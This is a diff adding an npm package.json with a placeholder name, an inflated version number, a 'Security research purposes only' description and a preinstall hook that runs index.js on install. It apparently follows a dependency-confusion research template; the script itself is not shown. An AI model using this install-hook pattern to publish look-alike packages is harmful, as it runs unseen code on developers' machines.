@@ -1,0 +1,12 @@
+{
+  "name": "!!!CHANGE_ME!!!",
+  "version": "1.98.97",
+  "description": "Security research purposes only.",
+  "main": "index.js",
+  "scripts": {
+    "test": "",
+    "preinstall": "node index.js"
+  },
+  "author": "",
+  "license": "GPLv3"
+}
